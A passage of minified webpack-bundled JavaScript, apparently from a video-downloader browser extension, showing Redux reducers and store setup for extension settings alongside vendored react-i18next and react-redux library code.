                [actionsTypes_SET_SEND_EVENT]: (state, action) => ({ ...state, sendEvent: action.value }),
                [actionsTypes_SET_DOWNLOADS_COUNT]: (state, action) => ({ ...state, downloadsCount: action.value }),
                [actionsTypes_SET_DOWNLOADED_IN_ROW]: (state, action) => ({ ...state, downloadedInRow: action.value }),
                [actionsTypes_SET_SCREENSHOTS_COUNT]: (state, action) => ({ ...state, screenshotsCount: action.value }),
                [actionsTypes_SET_DISPLAY_QR_CODES]: (state, action) => ({ ...state, displayQrCodes: action.value }),
                [actionsTypes_SET_WARN_BEFORE_CONVERTING]: (state, action) => ({ ...state, warnBeforeConverting: action.value }),
                [actionsTypes_SET_WARN_ABOUT_COMPETITORS_DETECTION]: (state, action) => ({ ...state, warnAboutCompetitorsDetection: action.value }),
                [actionsTypes_SET_SHOW_SNAPSHOT_BUTTON]: (state, action) => ({ ...state, showSnapshotButton: action.value }),
                [actionsTypes_SET_APP_BUTTON_STYLE]: (state, action) => ({ ...state, appButtonStyle: action.value }),
                [actionsTypes_SET_STATS]: (state, action) => ({ ...state, stats: action.value }),
                [actionsTypes_SET_DOWNLOADING_MODE]: (state, action) => ({ ...state, downloadingMode: action.value }),
                [actionsTypes_SET_RATING_MODAL_LAST_CHECK]: (state, action) => ({ ...state, ratingModalLastCheck: action.value }),
                [actionsTypes_SET_RATING_MODAL_NEVER_SHOW]: (state, action) => ({ ...state, ratingModalNeverShow: action.value }),
                [actionsTypes_SET_RATING_MODAL_LAST_NOT_NOW]: (state, action) => ({ ...state, ratingModalLastNotNow: action.value }),
                [actionsTypes_SET_LIST_MODE]: (state, action) => recalculateList({ ...state, listMode: action.value }),
                [actionsTypes_SET_INFO]: (state, action) => recalculateList({ ...state, info: action.value }),
                [actionsTypes_SET_SHOW_FORMATS_AVAILABLE_VIA_DESKTOP_CLIENT]: (state, action) => recalculateList({ ...state, showFormatsAvailableViaDesktopClient: action.value }),
                [actionsTypes_SET_SHOW_FORMATS_REQUIRED_ONLINE_CONVERSION]: (state, action) => recalculateList({ ...state, showFormatsRequiredOnlineConversion: action.value }),
                [actionsTypes_SET_SHOW_WEBM_VIDEOS]: (state, action) => recalculateList({ ...state, showWebmVideos: action.value }),
                [actionsTypes_SET_BODY_SCROLLBAR_WIDTH]: (state, action) => ({ ...state, bodyScrollbarWidth: action.value }),
                [actionsTypes_SET_EVENT_ROUTER]: (state, action) => ({ ...state, eventRouter: action.value }),
                [actionsTypes_ADD_PUBLIC_ID]: (state, action) => ({ ...state, publicIds: { ...state.publicIds, [action.value.name]: action.value.id } }),
            };
        var get_setters = __webpack_require__(135);
        const reducers = ((reducers) => (state, action) => (void 0 === state ? initialState : action.type in reducers ? reducers[action.type](state, action) : state))(reducers_handlers);
        let store_store;
        var src_store = async function () {
                if (store_store) return store_store;
                store_store = createStore(
                    reducers,
                    (function () {
                        for (var _len = arguments.length, middlewares = new Array(_len), _key = 0; _key < _len; _key++) middlewares[_key] = arguments[_key];
                        return function (createStore) {
                            return function () {
                                var store = createStore.apply(void 0, arguments),
                                    _dispatch = function () {
                                        throw new Error("Dispatching while constructing your middleware is not allowed. Other middleware would not be applied to this dispatch.");
                                    },
                                    middlewareAPI = {
                                        getState: store.getState,
                                        dispatch: function () {
                                            return _dispatch.apply(void 0, arguments);
                                        },
                                    },
                                    chain = middlewares.map(function (middleware) {
                                        return middleware(middlewareAPI);
                                    });
                                return _objectSpread2({}, store, { dispatch: (_dispatch = compose.apply(void 0, chain)(store.dispatch)) });
                            };
                        };
                    })(redux_thunk_es)
                );
                const sendEvent = get_send_event(store_store);
                store_store.dispatch(actions.setSendEvent(sendEvent));
                const updateContentLimit = async () => {
                    const contentLimit = await get_content_limit();
                    console.log("Content limit: " + contentLimit), store_store.dispatch(actions.setContentLimit(contentLimit)), setTimeout(updateContentLimit, 1e4);
                };
                updateContentLimit();
                const observers = ((store, actions) => ({
                    downloadsCount: () => store.dispatch(actions.syncDownloads()),
                    downloadedInRow: () => store.dispatch(actions.syncDownloadedInRow()),
                    screenshotsCount: () => store.dispatch(actions.syncScreenshots()),
                    displayQrCodes: () => store.dispatch(actions.syncDisplayQrCodes()),
                    showFormatsAvailableViaDesktopClient: () => store.dispatch(actions.syncShowFormatsAvailableViaDesktopClient()),
                    showFormatsRequiredOnlineConversion: () => store.dispatch(actions.syncShowFormatsRequiredOnlineConversion()),
                    showWebmVideos: () => store.dispatch(actions.syncShowWebmVideos()),
                    warnBeforeConverting: () => store.dispatch(actions.syncWarnBeforeConverting()),
                    warnAboutCompetitorsDetection: () => store.dispatch(actions.syncWarnAboutCompetitorsDetection()),
                    showSnapshotButton: () => store.dispatch(actions.syncShowSnapshotButton()),
                    appButtonStyle: () => store.dispatch(actions.syncAppButtonStyle()),
                    lang: () => store.dispatch(actions.syncLang()),
                    hid: () => store.dispatch(actions.syncHid()),
                    utm: () => store.dispatch(actions.syncUtm()),
                    stats: () => store.dispatch(actions.syncStats()),
                    ratingModalLastCheck: () => store.dispatch(actions.syncRatingModalLastCheck()),
                    ratingModalLastNotNow: () => store.dispatch(actions.syncRatingModalLastNotNow()),
                    ratingModalNeverShow: () => store.dispatch(actions.syncRatingModalNeverShow()),
                }))(store_store, actions);
                Object.keys(observers).forEach((key) => index_ext.observe(key, observers[key])), await Promise.all(Object.keys(observers).map((key) => observers[key]()));
                const setters = Object(get_setters.a)(store_store, actions);
                store_store.dispatch(actions.setAll(setters));
                const download = get_global(store_store, save_file);
                return store_store.dispatch(actions.setDownload(download)), (window.sendLog = get_send_log(store_store)), store_store;
            },
            react = __webpack_require__(0),
            react_default = __webpack_require__.n(react),
            slicedToArray = __webpack_require__(142),
            slicedToArray_default = __webpack_require__.n(slicedToArray),
            defineProperty = __webpack_require__(31),
            defineProperty_default = __webpack_require__.n(defineProperty),
            classCallCheck = __webpack_require__(143),
            classCallCheck_default = __webpack_require__.n(classCallCheck),
            createClass = __webpack_require__(144),
            createClass_default = __webpack_require__.n(createClass);
        function context_ownKeys(object, enumerableOnly) {
            var keys = Object.keys(object);
            if (Object.getOwnPropertySymbols) {
                var symbols = Object.getOwnPropertySymbols(object);
                enumerableOnly &&
                    (symbols = symbols.filter(function (sym) {
                        return Object.getOwnPropertyDescriptor(object, sym).enumerable;
                    })),
                    keys.push.apply(keys, symbols);
            }
            return keys;
        }
        function _objectSpread(target) {
            for (var i = 1; i < arguments.length; i++) {
                var source = null != arguments[i] ? arguments[i] : {};
                i % 2
                    ? context_ownKeys(Object(source), !0).forEach(function (key) {
                          defineProperty_default()(target, key, source[key]);
                      })
                    : Object.getOwnPropertyDescriptors
                    ? Object.defineProperties(target, Object.getOwnPropertyDescriptors(source))
                    : context_ownKeys(Object(source)).forEach(function (key) {
                          Object.defineProperty(target, key, Object.getOwnPropertyDescriptor(source, key));
                      });
            }
            return target;
        }
        var i18nInstance,
            defaultOptions = { bindI18n: "languageChanged", bindI18nStore: "", transEmptyNodeValue: "", transSupportBasicHtmlNodes: !0, transKeepBasicHtmlNodesFor: ["br", "strong", "i", "p"], useSuspense: !0 },
            I18nContext = react_default.a.createContext();
        function getDefaults() {
            return defaultOptions;
        }
        var context_ReportNamespaces = (function () {
            function ReportNamespaces() {
                classCallCheck_default()(this, ReportNamespaces), (this.usedNamespaces = {});
            }
            return (
                createClass_default()(ReportNamespaces, [
                    {
                        key: "addUsedNamespaces",
                        value: function (namespaces) {
                            var _this = this;
                            namespaces.forEach(function (ns) {
                                _this.usedNamespaces[ns] || (_this.usedNamespaces[ns] = !0);
                            });
                        },
                    },
                    {
                        key: "getUsedNamespaces",
                        value: function () {
                            return Object.keys(this.usedNamespaces);
                        },
                    },
                ]),
                ReportNamespaces
            );
        })();
        function getI18n() {
            return i18nInstance;
        }
        var initReactI18next = {
            type: "3rdParty",
            init: function (instance) {
                !(function () {
                    var options = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                    defaultOptions = _objectSpread(_objectSpread({}, defaultOptions), options);
                })(instance.options.react),
                    (function (instance) {
                        i18nInstance = instance;
                    })(instance);
            },
        };
        function warn() {
            if (console && console.warn) {
                for (var _console, _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++) args[_key] = arguments[_key];
                "string" == typeof args[0] && (args[0] = "react-i18next:: ".concat(args[0])), (_console = console).warn.apply(_console, args);
            }
        }
        var alreadyWarned = {};
        function warnOnce() {
            for (var _len2 = arguments.length, args = new Array(_len2), _key2 = 0; _key2 < _len2; _key2++) args[_key2] = arguments[_key2];
            ("string" == typeof args[0] && alreadyWarned[args[0]]) || ("string" == typeof args[0] && (alreadyWarned[args[0]] = new Date()), warn.apply(void 0, args));
        }
        function loadNamespaces(i18n, ns, cb) {
            i18n.loadNamespaces(ns, function () {
                if (i18n.isInitialized) cb();
                else {
                    i18n.on("initialized", function initialized() {
                        setTimeout(function () {
                            i18n.off("initialized", initialized);
                        }, 0),
                            cb();
                    });
                }
            });
        }
        function hasLoadedNamespace(ns, i18n) {
            var options = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
            if (!i18n.languages || !i18n.languages.length) return warnOnce("i18n.languages were undefined or empty", i18n.languages), !0;
            var lng = i18n.languages[0],
                fallbackLng = !!i18n.options && i18n.options.fallbackLng,
                lastLng = i18n.languages[i18n.languages.length - 1];
            if ("cimode" === lng.toLowerCase()) return !0;
            var loadNotPending = function (l, n) {
                var loadState = i18n.services.backendConnector.state["".concat(l, "|").concat(n)];
                return -1 === loadState || 2 === loadState;
            };
            return (
                !(options.bindI18n && options.bindI18n.indexOf("languageChanging") > -1 && i18n.services.backendConnector.backend && i18n.isLanguageChangingTo && !loadNotPending(i18n.isLanguageChangingTo, ns)) &&
                (!!i18n.hasResourceBundle(lng, ns) || !i18n.services.backendConnector.backend || !(!loadNotPending(lng, ns) || (fallbackLng && !loadNotPending(lastLng, ns))))
            );
        }
        function useTranslation_ownKeys(object, enumerableOnly) {
            var keys = Object.keys(object);
            if (Object.getOwnPropertySymbols) {
                var symbols = Object.getOwnPropertySymbols(object);
                enumerableOnly &&
                    (symbols = symbols.filter(function (sym) {
                        return Object.getOwnPropertyDescriptor(object, sym).enumerable;
                    })),
                    keys.push.apply(keys, symbols);
            }
            return keys;
        }
        function useTranslation_objectSpread(target) {
            for (var i = 1; i < arguments.length; i++) {
                var source = null != arguments[i] ? arguments[i] : {};
                i % 2
                    ? useTranslation_ownKeys(Object(source), !0).forEach(function (key) {
                          defineProperty_default()(target, key, source[key]);
                      })
                    : Object.getOwnPropertyDescriptors
                    ? Object.defineProperties(target, Object.getOwnPropertyDescriptors(source))
                    : useTranslation_ownKeys(Object(source)).forEach(function (key) {
                          Object.defineProperty(target, key, Object.getOwnPropertyDescriptor(source, key));
                      });
            }
            return target;
        }
        function useTranslation(ns) {
            var props = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {},
                i18nFromProps = props.i18n,
                _ref = Object(react.useContext)(I18nContext) || {},
                i18nFromContext = _ref.i18n,
                defaultNSFromContext = _ref.defaultNS,
                i18n = i18nFromProps || i18nFromContext || getI18n();
            if ((i18n && !i18n.reportNamespaces && (i18n.reportNamespaces = new context_ReportNamespaces()), !i18n)) {
                warnOnce("You will need to pass in an i18next instance by using initReactI18next");
                var notReadyT = function (k) {
                        return Array.isArray(k) ? k[k.length - 1] : k;
                    },
                    retNotReady = [notReadyT, {}, !1];
                return (retNotReady.t = notReadyT), (retNotReady.i18n = {}), (retNotReady.ready = !1), retNotReady;
            }
            i18n.options.react && void 0 !== i18n.options.react.wait && warnOnce("It seems you are still using the old wait option, you may migrate to the new useSuspense behaviour.");
            var i18nOptions = useTranslation_objectSpread(useTranslation_objectSpread(useTranslation_objectSpread({}, getDefaults()), i18n.options.react), props),
                useSuspense = i18nOptions.useSuspense,
                namespaces = ns || defaultNSFromContext || (i18n.options && i18n.options.defaultNS);
            (namespaces = "string" == typeof namespaces ? [namespaces] : namespaces || ["translation"]), i18n.reportNamespaces.addUsedNamespaces && i18n.reportNamespaces.addUsedNamespaces(namespaces);
            var ready =
                (i18n.isInitialized || i18n.initializedStoreOnce) &&
                namespaces.every(function (n) {
                    return hasLoadedNamespace(n, i18n, i18nOptions);
                });
            function getT() {
                return { t: i18n.getFixedT(null, "fallback" === i18nOptions.nsMode ? namespaces : namespaces[0]) };
            }
            var _useState = Object(react.useState)(getT()),
                _useState2 = slicedToArray_default()(_useState, 2),
                t = _useState2[0],
                setT = _useState2[1],
                isMounted = Object(react.useRef)(!0);
            Object(react.useEffect)(
                function () {
                    var bindI18n = i18nOptions.bindI18n,
                        bindI18nStore = i18nOptions.bindI18nStore;
                    function boundReset() {
                        isMounted.current && setT(getT());
                    }
                    return (
                        (isMounted.current = !0),
                        ready ||
                            useSuspense ||
                            loadNamespaces(i18n, namespaces, function () {
                                isMounted.current && setT(getT());
                            }),
                        bindI18n && i18n && i18n.on(bindI18n, boundReset),
                        bindI18nStore && i18n && i18n.store.on(bindI18nStore, boundReset),
                        function () {
                            (isMounted.current = !1),
                                bindI18n &&
                                    i18n &&
                                    bindI18n.split(" ").forEach(function (e) {
                                        return i18n.off(e, boundReset);
                                    }),
                                bindI18nStore &&
                                    i18n &&
                                    bindI18nStore.split(" ").forEach(function (e) {
                                        return i18n.store.off(e, boundReset);
                                    });
                        }
                    );
                },
                [i18n, namespaces.join()]
            );
            var isInitial = Object(react.useRef)(!0);
            Object(react.useEffect)(
                function () {
                    isMounted.current && !isInitial.current && setT(getT()), (isInitial.current = !1);
                },
                [i18n]
            );
            var ret = [t.t, i18n, ready];
            if (((ret.t = t.t), (ret.i18n = i18n), (ret.ready = ready), ready)) return ret;
            if (!ready && !useSuspense) return ret;
            throw new Promise(function (resolve) {
                loadNamespaces(i18n, namespaces, function () {
                    resolve();
                });
            });
        }
        var styled_components_browser_esm = __webpack_require__(1),
            ReactReduxContext = react_default.a.createContext(null);
        var batch_batch = function (callback) {
                callback();
            },
            nullListeners = { notify: function () {} };
        function createListenerCollection() {
            var batch = batch_batch,
                first = null,
                last = null;
            return {
                clear: function () {
                    (first = null), (last = null);
                },
                notify: function () {
                    batch(function () {
                        for (var listener = first; listener; ) listener.callback(), (listener = listener.next);
                    });
                },
                get: function () {
                    for (var listeners = [], listener = first; listener; ) listeners.push(listener), (listener = listener.next);
                    return listeners;
                },
                subscribe: function (callback) {
                    var isSubscribed = !0,
                        listener = (last = { callback: callback, next: null, prev: last });
                    return (
                        listener.prev ? (listener.prev.next = listener) : (first = listener),
                        function () {
                            isSubscribed &&
                                null !== first &&
                                ((isSubscribed = !1), listener.next ? (listener.next.prev = listener.prev) : (last = listener.prev), listener.prev ? (listener.prev.next = listener.next) : (first = listener.next));
                        }
                    );
                },
            };
        }
        var Subscription = (function () {
            function Subscription(store, parentSub) {
                (this.store = store), (this.parentSub = parentSub), (this.unsubscribe = null), (this.listeners = nullListeners), (this.handleChangeWrapper = this.handleChangeWrapper.bind(this));
            }
            var _proto = Subscription.prototype;
            return (
                (_proto.addNestedSub = function (listener) {
                    return this.trySubscribe(), this.listeners.subscribe(listener);
                }),
                (_proto.notifyNestedSubs = function () {
                    this.listeners.notify();
                }),
                (_proto.handleChangeWrapper = function () {
                    this.onStateChange && this.onStateChange();
                }),
                (_proto.isSubscribed = function () {
                    return Boolean(this.unsubscribe);
                }),
                (_proto.trySubscribe = function () {
                    this.unsubscribe || ((this.unsubscribe = this.parentSub ? this.parentSub.addNestedSub(this.handleChangeWrapper) : this.store.subscribe(this.handleChangeWrapper)), (this.listeners = createListenerCollection()));
                }),
                (_proto.tryUnsubscribe = function () {
                    this.unsubscribe && (this.unsubscribe(), (this.unsubscribe = null), this.listeners.clear(), (this.listeners = nullListeners));
                }),
                Subscription
            );
        })();
        var components_Provider = function (_ref) {
            var store = _ref.store,
                context = _ref.context,
                children = _ref.children,
                contextValue = Object(react.useMemo)(
                    function () {
                        var subscription = new Subscription(store);
                        return (subscription.onStateChange = subscription.notifyNestedSubs), { store: store, subscription: subscription };
                    },
                    [store]
                ),
                previousState = Object(react.useMemo)(
                    function () {
                        return store.getState();
                    },
                    [store]
                );
            Object(react.useEffect)(
                function () {
                    var subscription = contextValue.subscription;
                    return (
                        subscription.trySubscribe(),
                        previousState !== store.getState() && subscription.notifyNestedSubs(),
                        function () {
                            subscription.tryUnsubscribe(), (subscription.onStateChange = null);
                        }
                    );
                },
                [contextValue, previousState]
            );
            var Context = context || ReactReduxContext;
            return react_default.a.createElement(Context.Provider, { value: contextValue }, children);
        };
        function _extends() {
            return (_extends = Object.assign
                ? Object.assign.bind()
                : function (target) {
                      for (var i = 1; i < arguments.length; i++) {
                          var source = arguments[i];
                          for (var key in source) Object.prototype.hasOwnProperty.call(source, key) && (target[key] = source[key]);
                      }
                      return target;
                  }).apply(this, arguments);
        }
        function _objectWithoutPropertiesLoose(source, excluded) {
            if (null == source) return {};
            var key,
                i,
                target = {},
                sourceKeys = Object.keys(source);
            for (i = 0; i < sourceKeys.length; i++) (key = sourceKeys[i]), excluded.indexOf(key) >= 0 || (target[key] = source[key]);
            return target;
        }
        var hoist_non_react_statics_cjs = __webpack_require__(19),
            hoist_non_react_statics_cjs_default = __webpack_require__.n(hoist_non_react_statics_cjs),
            react_is = __webpack_require__(138),
            useIsomorphicLayoutEffect = "undefined" != typeof window && void 0 !== window.document && void 0 !== window.document.createElement ? react.useLayoutEffect : react.useEffect,
            EMPTY_ARRAY = [],
            NO_SUBSCRIPTION_ARRAY = [null, null];
        function storeStateUpdatesReducer(state, action) {
            var updateCount = state[1];
            return [action.payload, updateCount + 1];
        }
        function useIsomorphicLayoutEffectWithArgs(effectFunc, effectArgs, dependencies) {
            useIsomorphicLayoutEffect(function () {
                return effectFunc.apply(void 0, effectArgs);
            }, dependencies);
        }
        function captureWrapperProps(lastWrapperProps, lastChildProps, renderIsScheduled, wrapperProps, actualChildProps, childPropsFromStoreUpdate, notifyNestedSubs) {
            (lastWrapperProps.current = wrapperProps), (lastChildProps.current = actualChildProps), (renderIsScheduled.current = !1), childPropsFromStoreUpdate.current && ((childPropsFromStoreUpdate.current = null), notifyNestedSubs());
        }
        function subscribeUpdates(shouldHandleStateChanges, store, subscription, childPropsSelector, lastWrapperProps, lastChildProps, renderIsScheduled, childPropsFromStoreUpdate, notifyNestedSubs, forceComponentUpdateDispatch) {
            if (shouldHandleStateChanges) {
                var didUnsubscribe = !1,
                    lastThrownError = null,
                    checkForUpdates = function () {
                        if (!didUnsubscribe) {
                            var newChildProps,
                                error,
                                latestStoreState = store.getState();
                            try {
                                newChildProps = childPropsSelector(latestStoreState, lastWrapperProps.current);
                            } catch (e) {
                                (error = e), (lastThrownError = e);
                            }
                            error || (lastThrownError = null),
                                newChildProps === lastChildProps.current
                                    ? renderIsScheduled.current || notifyNestedSubs()
                                    : ((lastChildProps.current = newChildProps),
                                      (childPropsFromStoreUpdate.current = newChildProps),
                                      (renderIsScheduled.current = !0),
                                      forceComponentUpdateDispatch({ type: "STORE_UPDATED", payload: { error: error } }));
                        }
                    };
                (subscription.onStateChange = checkForUpdates), subscription.trySubscribe(), checkForUpdates();
                return function () {
                    if (((didUnsubscribe = !0), subscription.tryUnsubscribe(), (subscription.onStateChange = null), lastThrownError)) throw lastThrownError;
                };
            }
        }
        var initStateUpdates = function () {
            return [null, 0];
        };
        function connectAdvanced(selectorFactory, _ref) {
            void 0 === _ref && (_ref = {});
            var _ref2 = _ref,
                _ref2$getDisplayName = _ref2.getDisplayName,
                getDisplayName =
                    void 0 === _ref2$getDisplayName
                        ? function (name) {
                              return "ConnectAdvanced(" + name + ")";
                          }
                        : _ref2$getDisplayName,
                _ref2$methodName = _ref2.methodName,
                methodName = void 0 === _ref2$methodName ? "connectAdvanced" : _ref2$methodName,
                _ref2$renderCountProp = _ref2.renderCountProp,
                renderCountProp = void 0 === _ref2$renderCountProp ? void 0 : _ref2$renderCountProp,
                _ref2$shouldHandleSta = _ref2.shouldHandleStateChanges,
                shouldHandleStateChanges = void 0 === _ref2$shouldHandleSta || _ref2$shouldHandleSta,
                _ref2$storeKey = _ref2.storeKey,
                storeKey = void 0 === _ref2$storeKey ? "store" : _ref2$storeKey,
                _ref2$forwardRef = (_ref2.withRef, _ref2.forwardRef),
                forwardRef = void 0 !== _ref2$forwardRef && _ref2$forwardRef,
                _ref2$context = _ref2.context,
                context = void 0 === _ref2$context ? ReactReduxContext : _ref2$context,
                connectOptions = _objectWithoutPropertiesLoose(_ref2, ["getDisplayName", "methodName", "renderCountProp", "shouldHandleStateChanges", "storeKey", "withRef", "forwardRef", "context"]),
                Context = context;
            return function (WrappedComponent) {
                var wrappedComponentName = WrappedComponent.displayName || WrappedComponent.name || "Component",
                    displayName = getDisplayName(wrappedComponentName),
                    selectorFactoryOptions = _extends({}, connectOptions, {
                        getDisplayName: getDisplayName,
                        methodName: methodName,
                        renderCountProp: renderCountProp,
                        shouldHandleStateChanges: shouldHandleStateChanges,
                        storeKey: storeKey,
                        displayName: displayName,
                        wrappedComponentName: wrappedComponentName,
                        WrappedComponent: WrappedComponent,
                    }),
                    pure = connectOptions.pure;
                var usePureOnlyMemo = pure
                    ? react.useMemo
                    : function (callback) {
                          return callback();
                      };
                function ConnectFunction(props) {
                    var _useMemo = Object(react.useMemo)(
                            function () {
                                var reactReduxForwardedRef = props.reactReduxForwardedRef,
                                    wrapperProps = _objectWithoutPropertiesLoose(props, ["reactReduxForwardedRef"]);
                                return [props.context, reactReduxForwardedRef, wrapperProps];
                            },
                            [props]
                        ),
                        propsContext = _useMemo[0],
                        reactReduxForwardedRef = _useMemo[1],
                        wrapperProps = _useMemo[2],
                        ContextToUse = Object(react.useMemo)(
                            function () {
                                return propsContext && propsContext.Consumer && Object(react_is.isContextConsumer)(react_default.a.createElement(propsContext.Consumer, null)) ? propsContext : Context;
                            },
                            [propsContext, Context]
                        ),
                        contextValue = Object(react.useContext)(ContextToUse),
                        didStoreComeFromProps = Boolean(props.store) && Boolean(props.store.getState) && Boolean(props.store.dispatch);
                    Boolean(contextValue) && Boolean(contextValue.store);
                    var store = didStoreComeFromProps ? props.store : contextValue.store,
                        childPropsSelector = Object(react.useMemo)(
                            function () {
                                return (function (store) {
                                    return selectorFactory(store.dispatch, selectorFactoryOptions);
                                })(store);
                            },
                            [store]
                        ),
                        _useMemo2 = Object(react.useMemo)(
                            function () {
                                if (!shouldHandleStateChanges) return NO_SUBSCRIPTION_ARRAY;
                                var subscription = new Subscription(store, didStoreComeFromProps ? null : contextValue.subscription),
                                    notifyNestedSubs = subscription.notifyNestedSubs.bind(subscription);
                                return [subscription, notifyNestedSubs];
                            },
                            [store, didStoreComeFromProps, contextValue]
                        ),
                        subscription = _useMemo2[0],
                        notifyNestedSubs = _useMemo2[1],
                        overriddenContextValue = Object(react.useMemo)(
                            function () {
                                return didStoreComeFromProps ? contextValue : _extends({}, contextValue, { subscription: subscription });
                            },
                            [didStoreComeFromProps, contextValue, subscription]
                        ),
                        _useReducer = Object(react.useReducer)(storeStateUpdatesReducer, EMPTY_ARRAY, initStateUpdates),
                        previousStateUpdateResult = _useReducer[0][0],
                        forceComponentUpdateDispatch = _useReducer[1];
                    if (previousStateUpdateResult && previousStateUpdateResult.error) throw previousStateUpdateResult.error;
                    var lastChildProps = Object(react.useRef)(),
                        lastWrapperProps = Object(react.useRef)(wrapperProps),
                        childPropsFromStoreUpdate = Object(react.useRef)(),
                        renderIsScheduled = Object(react.useRef)(!1),
                        actualChildProps = usePureOnlyMemo(
                            function () {
                                return childPropsFromStoreUpdate.current && wrapperProps === lastWrapperProps.current ? childPropsFromStoreUpdate.current : childPropsSelector(store.getState(), wrapperProps);
                            },
                            [store, previousStateUpdateResult, wrapperProps]
                        );
                    useIsomorphicLayoutEffectWithArgs(captureWrapperProps, [lastWrapperProps, lastChildProps, renderIsScheduled, wrapperProps, actualChildProps, childPropsFromStoreUpdate, notifyNestedSubs]),
                        useIsomorphicLayoutEffectWithArgs(
                            subscribeUpdates,
                            [shouldHandleStateChanges, store, subscription, childPropsSelector, lastWrapperProps, lastChildProps, renderIsScheduled, childPropsFromStoreUpdate, notifyNestedSubs, forceComponentUpdateDispatch],
                            [store, subscription, childPropsSelector]
                        );
                    var renderedWrappedComponent = Object(react.useMemo)(
                        function () {
                            return react_default.a.createElement(WrappedComponent, _extends({}, actualChildProps, { ref: reactReduxForwardedRef }));
                        },
                        [reactReduxForwardedRef, WrappedComponent, actualChildProps]
                    );
                    return Object(react.useMemo)(
                        function () {
                            return shouldHandleStateChanges ? react_default.a.createElement(ContextToUse.Provider, { value: overriddenContextValue }, renderedWrappedComponent) : renderedWrappedComponent;
                        },
                        [ContextToUse, renderedWrappedComponent, overriddenContextValue]
                    );
                }
                var Connect = pure ? react_default.a.memo(ConnectFunction) : ConnectFunction;
                if (((Connect.WrappedComponent = WrappedComponent), (Connect.displayName = displayName), forwardRef)) {
                    var forwarded = react_default.a.forwardRef(function (props, ref) {
                        return react_default.a.createElement(Connect, _extends({}, props, { reactReduxForwardedRef: ref }));
                    });
                    return (forwarded.displayName = displayName), (forwarded.WrappedComponent = WrappedComponent), hoist_non_react_statics_cjs_default()(forwarded, WrappedComponent);
                }
                return hoist_non_react_statics_cjs_default()(Connect, WrappedComponent);
            };
        }
        function is(x, y) {
            return x === y ? 0 !== x || 0 !== y || 1 / x == 1 / y : x != x && y != y;
        }
        function shallowEqual(objA, objB) {
            if (is(objA, objB)) return !0;
            if ("object" != typeof objA || null === objA || "object" != typeof objB || null === objB) return !1;
            var keysA = Object.keys(objA),
                keysB = Object.keys(objB);
            if (keysA.length !== keysB.length) return !1;
            for (var i = 0; i < keysA.length; i++) if (!Object.prototype.hasOwnProperty.call(objB, keysA[i]) || !is(objA[keysA[i]], objB[keysA[i]])) return !1;
            return !0;
        }
        function wrapMapToPropsConstant(getConstant) {
            return function (dispatch, options) {
                var constant = getConstant(dispatch, options);
                function constantSelector() {
                    return constant;
                }
                return (constantSelector.dependsOnOwnProps = !1), constantSelector;
            };
        }
        function getDependsOnOwnProps(mapToProps) {
            return null !== mapToProps.dependsOnOwnProps && void 0 !== mapToProps.dependsOnOwnProps ? Boolean(mapToProps.dependsOnOwnProps) : 1 !== mapToProps.length;
        }
        function wrapMapToPropsFunc(mapToProps, methodName) {
            return function (dispatch, _ref) {
                _ref.displayName;
                var proxy = function (stateOrDispatch, ownProps) {
                    return proxy.dependsOnOwnProps ? proxy.mapToProps(stateOrDispatch, ownProps) : proxy.mapToProps(stateOrDispatch);
                };
                return (
                    (proxy.dependsOnOwnProps = !0),
                    (proxy.mapToProps = function (stateOrDispatch, ownProps) {
                        (proxy.mapToProps = mapToProps), (proxy.dependsOnOwnProps = getDependsOnOwnProps(mapToProps));
                        var props = proxy(stateOrDispatch, ownProps);
                        return "function" == typeof props && ((proxy.mapToProps = props), (proxy.dependsOnOwnProps = getDependsOnOwnProps(props)), (props = proxy(stateOrDispatch, ownProps))), props;
                    }),
                    proxy
                );
            };
        }
        var connect_mapDispatchToProps = [
            function (mapDispatchToProps) {
                return "function" == typeof mapDispatchToProps ? wrapMapToPropsFunc(mapDispatchToProps) : void 0;
            },
            function (mapDispatchToProps) {
                return mapDispatchToProps
                    ? void 0
                    : wrapMapToPropsConstant(function (dispatch) {
                          return { dispatch: dispatch };
                      });
            },
            function (mapDispatchToProps) {
                return mapDispatchToProps && "object" == typeof mapDispatchToProps
                    ? wrapMapToPropsConstant(function (dispatch) {
                          return (function (actionCreators, dispatch) {
                              if ("function" == typeof actionCreators) return bindActionCreator(actionCreators, dispatch);
                              if ("object" != typeof actionCreators || null === actionCreators)
                                  throw new Error(
                                      "bindActionCreators expected an object or a function, instead received " +
                                          (null === actionCreators ? "null" : typeof actionCreators) +
                                          '. Did you write "import ActionCreators from" instead of "import * as ActionCreators from"?'
                                  );
                              var boundActionCreators = {};
                              for (var key in actionCreators) {
                                  var actionCreator = actionCreators[key];
                                  "function" == typeof actionCreator && (boundActionCreators[key] = bindActionCreator(actionCreator, dispatch));
                              }
                              return boundActionCreators;
                          })(mapDispatchToProps, dispatch);
                      })
                    : void 0;
            },
        ];
        var connect_mapStateToProps = [
            function (mapStateToProps) {
                return "function" == typeof mapStateToProps ? wrapMapToPropsFunc(mapStateToProps) : void 0;
            },
            function (mapStateToProps) {
                return mapStateToProps
                    ? void 0
                    : wrapMapToPropsConstant(function () {
                          return {};
                      });
            },
        ];
        function defaultMergeProps(stateProps, dispatchProps, ownProps) {
            return _extends({}, ownProps, {}, stateProps, {}, dispatchProps);
        }
        var connect_mergeProps = [
            function (mergeProps) {
                return "function" == typeof mergeProps
                    ? (function (mergeProps) {
                          return function (dispatch, _ref) {
                              _ref.displayName;
                              var mergedProps,
                                  pure = _ref.pure,
                                  areMergedPropsEqual = _ref.areMergedPropsEqual,
                                  hasRunOnce = !1;
                              return function (stateProps, dispatchProps, ownProps) {
                                  var nextMergedProps = mergeProps(stateProps, dispatchProps, ownProps);
                                  return hasRunOnce ? (pure && areMergedPropsEqual(nextMergedProps, mergedProps)) || (mergedProps = nextMergedProps) : ((hasRunOnce = !0), (mergedProps = nextMergedProps)), mergedProps;
                              };
                          };
                      })(mergeProps)
                    : void 0;
            },
            function (mergeProps) {
                return mergeProps
                    ? void 0
                    : function () {
                          return defaultMergeProps;
                      };
            },
        ];
        function impureFinalPropsSelectorFactory(mapStateToProps, mapDispatchToProps, mergeProps, dispatch) {
            return function (state, ownProps) {
                return mergeProps(mapStateToProps(state, ownProps), mapDispatchToProps(dispatch, ownProps), ownProps);
            };
        }
        function pureFinalPropsSelectorFactory(mapStateToProps, mapDispatchToProps, mergeProps, dispatch, _ref) {
            var state,
                ownProps,
                stateProps,
                dispatchProps,
                mergedProps,
                areStatesEqual = _ref.areStatesEqual,
